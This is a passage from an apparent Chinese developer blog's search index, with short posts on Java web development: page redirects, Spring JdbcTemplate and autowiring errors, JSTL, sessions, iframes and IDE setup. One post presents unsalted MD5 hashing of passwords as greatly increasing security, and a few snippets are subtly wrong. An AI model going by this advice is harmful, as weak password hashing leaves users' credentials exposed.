            <tag> 收录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的页面跳转</title>
      <link href="/2019/11/27/ssm/forward/"/>
      <url>/2019/11/27/ssm/forward/</url>
      
        <content type="html"><![CDATA[<h3 id="HTML方式"><a href="#HTML方式" class="headerlink" title="HTML方式"></a>HTML方式</h3><h4 id="复制即用"><a href="#复制即用" class="headerlink" title="复制即用"></a>复制即用</h4><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;4;url=&#39;http://localhost:7002/&#39;;&quot;&gt; //cotent  中数字是跳转的时间  URL是跳转的路径&lt;title&gt;用户注册&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {     background: #555}.loading {     -webkit-animation: fadein 2s;     -moz-animation: fadein 2s;     -o-animation: fadein 2s;     animation: fadein 2s}@-moz-keyframes fadein {     from {          opacity: 0     }     to {          opacity: 1     }}@-webkit-keyframes fadein {     from {          opacity: 0     }     to {          opacity: 1     }}@-o-keyframes fadein {     from {          opacity: 0     }     to {          opacity: 1     }}@keyframes fadein {     from {          opacity: 0     }     to {          opacity: 1     }}.spinner-wrapper {     position: absolute;     top: 0;     left: 0;     z-index: 300;               height: 100%;     min-width: 100%;     min-height: 100%;     background: rgba(255,255,255,0.93)}.spinner-text {     position: absolute;     top: 45%;     left: 50%;     margin-left: -100px;     margin-top: 2px;     //调整文字的位置     color: #000;     letter-spacing: 1px;     font-size: 20px;     font-family: Arial}.spinner {     position: absolute;     top: 45%;     left: 50%;     display: block;     margin-left: -160px;     width: 1px;     height: 1px;     //调整转圈的位置     border: 30px solid rgba(255,0,0,1);     -webkit-border-radius: 50px;     -moz-border-radius: 50px;     border-radius: 50px;     border-left-color: transparent;     border-right-color: transparent;     -webkit-animation: spin 1.5s infinite;     -moz-animation: spin 1.5s infinite;     animation: spin 1.5s infinite}@-webkit-keyframes spin {     0%,100% {          -webkit-transform: rotate(0deg) scale(1)     }     50% {          -webkit-transform: rotate(720deg) scale(0.6)     }}@-moz-keyframes spin {     0%,100% {          -moz-transform: rotate(0deg) scale(1)     }     50% {          -moz-transform: rotate(720deg) scale(0.6)     }}@-o-keyframes spin {     0%,100% {          -o-transform: rotate(0deg) scale(1)     }     50% {          -o-transform: rotate(720deg) scale(0.6)     }}@keyframes spin {     0%,100% {          transform: rotate(0deg) scale(1)     }     50% {          transform: rotate(720deg) scale(0.6)     }}&lt;/style&gt;&lt;script&gt;        var count = 3;        var interval = window.setInterval(&quot;timeout()&quot;,1000);        function timeout() {          var s=document.getElementById(&quot;spinner&quot;);          s.innerHTML=&quot;注册成功，页面将在&quot;+count+&quot;秒后跳转&quot;;      //定时器控制跳转          count--;      }&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;loading&quot;&gt;  &lt;div class=&quot;spinner-wrapper&quot;&gt;    &lt;span class=&quot;spinner-text&quot; &gt;&lt;h2 id=&quot;spinner&quot;&gt;注册成功，页面将在3秒后跳转&lt;/h2&gt;&lt;/span&gt;     &lt;span class=&quot;spinner&quot;&gt;&lt;/span&gt;  &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;</code></pre><h3 id="js方式"><a href="#js方式" class="headerlink" title="js方式"></a>js方式</h3><pre><code>    &lt;script type=&quot;text/javascript&quot;&gt;    Location.href=&quot;1.html&quot;;    &lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 页面跳转 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> 跳转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLErrorCodes</title>
      <link href="/2019/11/26/ssm/springsqlerror/"/>
      <url>/2019/11/26/ssm/springsqlerror/</url>
      
        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>使用Spring 的JDBCtemplate 调用数据库的时候</p><p>出现了如下的问题</p><p>SQLErrorCodes loaded: [DB2, Derby, H2, HSQL, Informix, MS-SQL, MySQL, Oracle, PostgreSQL, Sybase]</p><p>这个一般是因为SQL语句出错  会报这样的错误</p><p>这个时候关注Sql 语句的格式  以及字段长度 的问题</p><p>可以先在Sqlyog上先试运行一下。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;c:foreach&gt;无法迭代链表</title>
      <link href="/2019/11/25/ssm/cforech/"/>
      <url>/2019/11/25/ssm/cforech/</url>
      
        <content type="html"><![CDATA[<h3 id="问题详情"><a href="#问题详情" class="headerlink" title="问题详情"></a>问题详情</h3><p>java.lang.NumberFormatException: For input string: “name”<br>背景：action中查询出list数据需要在前台进行显示，但根据主键在数据库中查询出的数据list中含有熟悉alist属性为配置表，且支持用户多选，前端通过el表达式显示</p><p>前台界面为：</p><pre><code>&lt;c:forEach items=&quot;${list}&quot; var=&quot;visit&quot; varStatus=&quot;vstatus&quot;&gt;                   ${visit.alist.Name}                  &lt;/c:forEach&gt;</code></pre><p>此时运行程序会出现java.lang.NumberFormatException: For input string: “name”错误，原因为${visit.alist}是一个list不是一个单一属性</p><p>解决方法：</p><p>笨方法：</p><pre><code>&lt;c:forEach items=&quot;${list}&quot; var=&quot;visit&quot; varStatus=&quot;vstatus&quot;&gt;${visit.alist[0].Name}${visit.alist[1].Name}${visit.alist[2].Name}${visit.alist[3].Name}&lt;/c:forEach&gt;</code></pre><p>页面会显示用户在多选时勾选的数据，假设alist中有4项，，用户全部勾选则可全部显示，用户单一勾选则仅显示单一量</p><p>for循环方法</p><pre><code>&lt;c:forEach items=&quot;${visit.alist}&quot; var=&quot;a&quot; varStatus=&quot;vstatus&quot;&gt;${a.Name }&lt;/c:forEach&gt;</code></pre><p> 注意，items前不可有空格</p>]]></content>
      
      
      <categories>
          
          <category> JSTL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 传递 </tag>
            
            <tag> JSTL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC注解报错</title>
      <link href="/2019/11/23/ssm/springbean/"/>
      <url>/2019/11/23/ssm/springbean/</url>
      
        <content type="html"><![CDATA[<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p><img src="http://img.ahdy.top/2019-11-22_140009.png" alt></p><h4 id="翻译后"><a href="#翻译后" class="headerlink" title="翻译后"></a>翻译后</h4><p>创建名称为“XXXXXXX”的bean时出错:自动连接依赖项的注入失败;嵌套异常是无法自动连接字段:com.zyxx. egg.dao。MachineDao com.zyxx.eggs.controller.DataTransferController.machineDao;嵌套异常是org.springframe .beans.factory。NoSuchBeanDefinitionException:没有匹配类型的bean [com.zyxx. egg.dao]。为依赖项找到的MachineDao]:期望至少有一个bean符合此依赖项的自动连接候选。依赖注释:<a href="mailto:{@org.springframework.beans.factory.annotation.Autowired" target="_blank" rel="noopener">{@org.springframework.beans.factory.annotation.Autowired</a>(要求= true)}</p><pre><code>//解决Java Spring Mvc框架 ，Spring框架如果出现这个 autowired 一般都是注解问题，就要检查，service层，dao层的注解如果出现这个情况请检查  新建的dao实现类  是否加了 @Repository注解  或者新建的service实现类  是否加了 @Service注解</code></pre>]]></content>
      
      
      <categories>
          
          <category> Session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> 注解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Session会话</title>
      <link href="/2019/11/23/ssm/session/"/>
      <url>/2019/11/23/ssm/session/</url>
      
        <content type="html"><![CDATA[<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre><code>El表达式获取session对象变量 session.setAttribute（&quot;age&quot;，&quot;123&quot;）;   ${ sessionScope.age}  在页面上显示的就是123了 这里相当于把123的值赋值给了age获取对象属性的值${sessionScope.age.name}前提是要将一个object对象，传给age，这样通过age才能.到对象的元素。  </code></pre><h4 id="数组对象"><a href="#数组对象" class="headerlink" title="数组对象"></a>数组对象</h4><p>session中是对象数组：</p><p>jstl方法：</p><p>jsp中头部添加</p><p>&lt;%@ taglib uri=”<a href="http://java.sun.com/jsp/jstl/core&quot;" target="_blank" rel="noopener">http://java.sun.com/jsp/jstl/core&quot;</a> prefix=”c”%&gt;</p><pre><code>&lt;table&gt;&lt;c:forEach items=&quot;${list}&quot; var=&quot;bean&quot;&gt;       &lt;tr&gt;    &lt;td&gt;${bean.id}&lt;/td&gt;    &lt;td&gt;${bean.name}&lt;/td&gt;       &lt;/tr&gt; &lt;/c:forEach&gt;&lt;/table&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Session </tag>
            
            <tag> EL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Session无法获取</title>
      <link href="/2019/11/23/ssm/sessionnull/"/>
      <url>/2019/11/23/ssm/sessionnull/</url>
      
        <content type="html"><![CDATA[<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>暂时的解决方法有两种，亲测有效：</p><p>方法一：  将页面跳转方式由a标签改为请求转发request.getRequestDispatcher(“stu_list.jsp”).forward(request, response)，然后用EL表达式在页面获取。</p><p>方法二 ： 将session的ID存到Cookie中，并设置失效时间，跳转页面之后session依然可用<br><img src="http://img.ahdy.top/Cookie.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Session </tag>
            
            <tag> 传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iframe标签</title>
      <link href="/2019/11/23/ssm/ifream/"/>
      <url>/2019/11/23/ssm/ifream/</url>
      
        <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>当你写一个后台管理的时候，子页面加载显得尤为重要，它能在不加载整个页面的情况下实现页面刷新，嗯，跟ajax很像，但是Ajax需要的参数就多了，而这里要说的子页面加载只需要一个标签就可以搞定。</p><pre><code>&lt;iframe runat=&quot;server&quot; src=&quot;you page&#39;s url&quot; width=&quot;750&quot; height=&quot;30&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; allowtransparency=&quot;yes&quot;&gt;&lt;/iframe&gt;</code></pre><p>runat=”server” 这个最好加上Iframe跳转 asp.net 可在当前iframe中跳转</p><p>src 链接到的地址URl</p><p>frameborder 是否显示边框（0无边框 1有边框）</p><p>scrolling 是否有滚动条（yes有滚动条 no无滚动条）</p><p>allowtransparency 背景是否透明（yes透明 no不透明）</p><h3 id="代码展示"><a href="#代码展示" class="headerlink" title="代码展示"></a>代码展示</h3><h4 id="主页面"><a href="#主页面" class="headerlink" title="主页面"></a>主页面</h4><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;iframe的应用&lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function fun1(){        document.getElementById(&quot;iframes&quot;).src=&quot;2.html&quot;;    }    function fun3(){        document.getElementById(&quot;iframes&quot;).src=&quot;3.html&quot;;    }&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt;&lt;li id=&quot;p1&quot; onclick=&quot;fun1()&quot;&gt;page1&lt;/li&gt;&lt;li id=&quot;p2&quot;&gt;page2&lt;/li&gt;&lt;li id=&quot;p3&quot; onclick=&quot;fun3()&quot;&gt;page3&lt;/li&gt;&lt;li id=&quot;p4&quot;&gt;page4&lt;/li&gt;&lt;/ul&gt;&lt;iframe id=&quot;iframes&quot; src=&quot;1.html&quot; height=&quot;80%&quot; width=&quot;100%&quot; runat=&quot;server&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="子页面"><a href="#子页面" class="headerlink" title="子页面"></a>子页面</h4><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    231321&lt;/body&gt;&lt;/html&gt;</code></pre><p>子页面随便写！</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="http://img.ahdy.top/iframes.gif" alt></p>]]></content>
      
      
      <categories>
          
          <category> 子页面加载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子页面 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布局样式失效</title>
      <link href="/2019/11/23/ssm/missimgcss/"/>
      <url>/2019/11/23/ssm/missimgcss/</url>
      
        <content type="html"><![CDATA[<h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p>当使用重定向转发时发现跳转后的界面失去了布局样式，这种情况一般是路径问题。<br>当在jsp中引入css时，如果其相对路径相对于当前jsp文件的，而在一个和这个jsp的路径不一样的servlet中forward这个jsp时，就会发现这个css样式根本没有起作用。</p><p>这是因为在servlet中转发时css的路径就是相对于这个servlet的相对路径而非jsp的路径了。</p><p>所以这时候不能在jsp中用这样的路径：</p><p><link href="one.css" rel="stylesheet" type="text/css"><br>或者</p><p><link href="../../one.css" rel="stylesheet" type="text/css"></p><h4 id="在css-js的路径前加-pageContext-request-contextPath-，就可以了"><a href="#在css-js的路径前加-pageContext-request-contextPath-，就可以了" class="headerlink" title="在css/js的路径前加${pageContext.request.contextPath}，就可以了"></a>在css/js的路径前加${pageContext.request.contextPath}，就可以了</h4><p>${pageContext.request.contextPath}是JSP取得绝对路径的方法，等价于&lt;%=request.getContextPath()%&gt; 。<br>也就是取出部署的应用程序名或者是当前的项目名称</p><p>比如我的项目名称是demo1在浏览器中输入为<a href="http://localhost:8080/demo1/a.jsp" target="_blank" rel="noopener">http://localhost:8080/demo1/a.jsp</a> ${pageContext.request.contextPath}或&lt;%=request.getContextPath()%&gt;取出来的就是/demo1,而”/“代表的含义就是<a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a></p><p>故有时候项目中这样写${pageContext.request.contextPath}/a.jsp</p>]]></content>
      
      
      <categories>
          
          <category> 样式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA修改</title>
      <link href="/2019/11/23/ssm/idea8080/"/>
      <url>/2019/11/23/ssm/idea8080/</url>
      
        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>当你用了一段时间IDEA后你就会发现，它强大的地方也是它的弱点，它强大了代码的索引，但是失去了eclipse的轻便。</p><h3 id="修改默认访问项目路径为8080"><a href="#修改默认访问项目路径为8080" class="headerlink" title="修改默认访问项目路径为8080"></a>修改默认访问项目路径为8080</h3><p>以lochost://8080直接访问项目<br><img src="http://img.ahdy.top/2019-11-23_004527.png" alt="tomcat-&gt;Edit configuration"><br><img src="http://img.ahdy.top/2019-11-23_004456.png" alt="改成这样就OK"></p><h3 id="修改idea软件端口号"><a href="#修改idea软件端口号" class="headerlink" title="修改idea软件端口号"></a>修改idea软件端口号</h3><p>为什么要修改软件端口号呢，这个可能有时候会出现端口占用，概率极低<br>知道了解一下就好。<br>file -&gt;settings<br><img src="http://img.ahdy.top/2019-11-23_004712.png" alt></p><h3 id="修改字符集编码"><a href="#修改字符集编码" class="headerlink" title="修改字符集编码"></a>修改字符集编码</h3><p><img src="http://img.ahdy.top/2019-11-23_004610.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5加密</title>
      <link href="/2019/11/23/ssm/md5/"/>
      <url>/2019/11/23/ssm/md5/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>MD5是一种加密算法，据说这种加密不可能通过逆向解算来破解，但是由于其对密码字典加密的结果都是固定的，于是出现了撞库解密的方式，原理很简单，拿大量的数据去使用MD5加密，将加密过后的哈希值存入到数据库当中，然后就能通过明文来查询到加密过后的哈希值。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在项目开发过程中使用，详情百度相关jar包  </p><pre><code>password = DigestUtils.md5Hex(password);md5不会影响sql执行的结果，前提是数据库当中的密码也是哈希值</code></pre><p>这其实是一个坑，就是你数据库当中的密码不能是明文，只有与字符串加密过后的哈希值一样才能查询到相关数据，这也验证了撞库破解，MD5加密大大增加了安全性。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring jdbcTemplate</title>
      <link href="/2019/11/22/ssm/jdbc/"/>
      <url>/2019/11/22/ssm/jdbc/</url>
      
        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>这里的空意思是一个异常，通常如果不知道哪里出错了，还是避免自定义异常，系统自动捕获的异常更有利于我们发现bug。</p><pre><code>//验证登录@Overridepublic Students  getUser(String name, String password) {RowMapper&lt;Students&gt; rowMapper=new BeanPropertyRowMapper&lt;Students&gt;(Students.class);String sql = &quot;select * from students where name=? and password=?&quot;;Students students ;try {        students= jdbcTemplate.queryForObject(sql, rowMapper, name, password);        System.out.println(students);    } catch (Exception e) {        return null;    }    System.out.println(&quot;user:&quot;+students);    return students;}</code></pre><p>数据库中可能存在了相同用户名及密码的情况，造成查询结果不唯一，查询到多个用户。将sql放在数据库里跑一下，发现有无重复数据。  </p><p>Spring中使用JdbcTemplate的queryForObject方法，当查不到数据时会抛出如下异常</p><pre><code>org.springframework.dao.EmptyResultDataAccessException: Incorrect result size: expected 1, actual 0org.springframework.dao.support.DataAccessUtils.(DataAccessUtils.java:71)org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:729)</code></pre><p>使用Debug进行调试时，发现是在DataAccessUtils的requiredSingleResult()方法中抛出的异常。<br>源码如下：</p><pre><code>public static &lt;T&gt; T requiredSingleResult(Collection&lt;T&gt; results) throws IncorrectResultSizeDataAccessException {      int size = (results != null ? results.size() : 0);      if (size == 0) {          throw new EmptyResultDataAccessException(1);      }      if (results.size() &gt; 1) {          throw new IncorrectResultSizeDataAccessException(1, size);      }      return results.iterator().next();  } </code></pre><p>可以看出，当results为空时，就会抛出EmptyResultDataAccessException异常，Spring这样做的目的是为了防止程序员不对空值进行判断，保证了程序的健壮性。另外，当results的size大于1时，还会<br>当results的size大于1时，还会抛出IncorrectResultSizeDataAccessException异常，以保证返回的记录只有一条。<br>如果我们想查询结果为空时，返回null而不是抛出异常，该怎么办呢？<br>很简单，只需要在捕获EmptyResultDataAccessException，然后返回null，代码如下：</p><pre><code>Object object = null;  try {  object = jdbcTemplate.queryForObject();  } catch (EmptyResultDataAccessException e) {  return null;  }  return object;  </code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA解决maven创建过长</title>
      <link href="/2019/11/19/framework/ideaproblem/"/>
      <url>/2019/11/19/framework/ideaproblem/</url>
      
        <content type="html"><![CDATA[<h3 id="问题的发生"><a href="#问题的发生" class="headerlink" title="问题的发生"></a>问题的发生</h3><p>如果你用了一段时间的idea你就会发现，它创建maven项目的时间实在是太久了，网络好的情况下还可能快点，但是它要上网去下载maven所需要的jar包，而且这些jar包的下载地址都在境外，所以造成了maven创建极为费时。</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><pre><code> 配置 archetypeCatalog = internal 第一次从网络下载,之后就会选择本地已经下载好的文件</code></pre><p><img src="http://img.ahdy.top/2019-11-19_001029.png" alt><br><img src="http://img.ahdy.top/2019-11-19_001249.png" alt="此处点击加号按钮设置"><br>这样配置好了之后，几秒就能完成maven项目创建。</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eclipse报错</title>
      <link href="/2019/11/18/java/eclipseoor/"/>
      <url>/2019/11/18/java/eclipseoor/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>导入了一个tomcat是7.0版本的文件（eclipse用的是8.0版本的），改了jar包后还是发现会出现the selection cannot be run on any server。  </p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>找到项目的根目录，右键项目show in –&gt;system explore<br>找到setting文件夹<br><img src="http://img.ahdy.top/2019-11-18_150316.png" alt><br><img src="http://img.ahdy.top/2019-11-18_150354.png" alt><br>修改该文件内配置参数。<br>    把runtime name=”Apache Tomcat v7.0”/&gt;改为8.0就可以用了。<br>如果还出现了</p><p>Server Tomcat v7.0 Server at localhost failed to start.</p><p>那就把<installed facet="jst.web" version="2.5">的version改为跟你的eclipse版本一致，假如版本是</installed></p><p>3.1的那就改为3.1</p>]]></content>
      
      
      <categories>
          
          <category> eclipse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA报错</title>
      <link href="/2019/11/18/framework/ideatomerror/"/>
      <url>/2019/11/18/framework/ideatomerror/</url>
      
        <content type="html"><![CDATA[<h3 id="问题详情"><a href="#问题详情" class="headerlink" title="问题详情"></a>问题详情</h3><p>导入项目，或者新建项目的时候，tomcat无法启动，或者没有启动tom的选项<br><img src="http://img.ahdy.top/2019-11-17_210406.png" alt><br><a href="https://blog.csdn.net/small_mouse0/article/details/77506060" target="_blank" rel="noopener">参考文档</a></p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密解密</title>
      <link href="/2019/11/18/framework/findjson/"/>
      <url>/2019/11/18/framework/findjson/</url>
      
        <content type="html"><![CDATA[<h3 id="JSON数据格式检测"><a href="#JSON数据格式检测" class="headerlink" title="JSON数据格式检测"></a>JSON数据格式检测</h3><p><a href="https://www.bejson.com/" target="_blank" rel="noopener">检测地址</a><br>将json数据放入<br><img src="http://img.ahdy.top/2019-11-18_143234.png" alt></p><h3 id="MD5哈希值解析"><a href="#MD5哈希值解析" class="headerlink" title="MD5哈希值解析"></a>MD5哈希值解析</h3><p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">解析地址</a><br><img src="http://img.ahdy.top/2019-11-18_143008.png" alt></p><h3 id="算法加密"><a href="#算法加密" class="headerlink" title="算法加密"></a>算法加密</h3><p><a href="http://www.jsons.cn/sha/" target="_blank" rel="noopener">加密地址</a>  </p><p><img src="http://img.ahdy.top/2020-01-07_233146.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eclipse驱动报错</title>
      <link href="/2019/11/17/java/eclipseerror/"/>
      <url>/2019/11/17/java/eclipseerror/</url>
      
        <content type="html"><![CDATA[<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><h4 id="java-lang-ClassNotFoundException-com-mysql-jdbc-Driver"><a href="#java-lang-ClassNotFoundException-com-mysql-jdbc-Driver" class="headerlink" title="java.lang.ClassNotFoundException: com.mysql.jdbc.Driver"></a>java.lang.ClassNotFoundException: com.mysql.jdbc.Driver</h4><p><a href="https://blog.csdn.net/weixin_43157199/article/details/82792105" target="_blank" rel="noopener">CSDN</a><br>至于为啥我也不清楚，但是根据文档里面一弄就好了。。。</p><p>其实我很多时候都会对代码，或者编译器几种疑惑  </p><p>一种是：奇怪了，竟然可以运行  </p><p>另一种：奇怪了，竟然不能运行  </p><p>还有一种就是：啥都没动程序就崩了，啥都没动莫名其妙就好了~~</p>]]></content>
      
      
      <categories>
          
          <category> eclipse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA报错</title>
      <link href="/2019/11/17/framework/ideaerror/"/>
      <url>/2019/11/17/framework/ideaerror/</url>
      
        <content type="html"><![CDATA[<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p><a href="https://blog.csdn.net/malz_zh/article/details/85098356" target="_blank" rel="noopener">参考此文档</a><br>简单解释一下：<br>最主要的原因是idea没有加载到jsp所在文件的配置。<br><img src alt><br>修改resource下webapp路径即可。</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于IDEA无选项创建的问题</title>
      <link href="/2019/11/17/framework/ideafile/"/>
      <url>/2019/11/17/framework/ideafile/</url>
      
        <content type="html"><![CDATA[<h3 id="IDEA无法创建-class文件"><a href="#IDEA无法创建-class文件" class="headerlink" title="IDEA无法创建.class文件"></a>IDEA无法创建.class文件</h3><p>这个问题在eclipse当中就不会出现，但是在idea中，它是作为一个新手最有可能碰到的问题。<br>因为idea当中的文件夹是分级别的，每种颜色的文件夹都代表着不同的构建权限。<br><img src="http://img.ahdy.top/2019-11-17_002223.png" alt="配置文件夹权限"><br><img src="http://img.ahdy.top/2019-11-17_002422.png" alt="配置文件夹权限"><br>选择你要赋予权限的文件夹，进行权限分配。</p><p>在Modules页面中，可以看到，项目的文件夹分为4类</p><p>Sources：Java源代码</p><p>Test：Java测试源代码</p><p>Resources：配置文件等资源</p><p>Test Resources：测试配置文件等资源</p><p>Excluded：排除在Modules之外的文件夹</p><p>Sources是必须的，其它文件夹可以没有。Java文件只能在Sources或者Test文件夹里面。</p><p>OK掉之后就可以了。</p><h3 id="IDEA无法创建servlet"><a href="#IDEA无法创建servlet" class="headerlink" title="IDEA无法创建servlet"></a>IDEA无法创建servlet</h3><p>这种情况可能有多种，我遇到的是第一种，项目内缺少了相关servlet.api.jar包。在pom.xml文件夹内进行引入就可以了。   </p><ol><li>IDEA在当前项目中没有检测到Servlet相关的包，所有就不会提供Servlet的创建</li></ol><p>只要提供包IDEA就识别了，如果加入包没有及时下载，可以刷新一下maven就可以了<br>jar包：  </p><p><img src="http://img.ahdy.top/2019-11-17_003210.png" alt><br>2.<br>第二种情况是项目配置文件的问题可以参考<br><a href="https://blog.csdn.net/lalala323/article/details/89301837" target="_blank" rel="noopener">CSDN</a></p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓权限</title>
      <link href="/2019/11/15/as/aspower/"/>
      <url>/2019/11/15/as/aspower/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/Znnnnnnnn/article/details/89356803" target="_blank" rel="noopener">json数据获取</a><br><a href="https://blog.csdn.net/chaoyu168/article/details/89377395" target="_blank" rel="noopener">安全权限</a><br>不想说太多，安卓是个坑。</p>]]></content>
      
      
      <categories>
          
          <category> AS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AS </tag>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日记</title>
      <link href="/2019/11/15/draiy/wherecanigo/"/>
      <url>/2019/11/15/draiy/wherecanigo/</url>
      
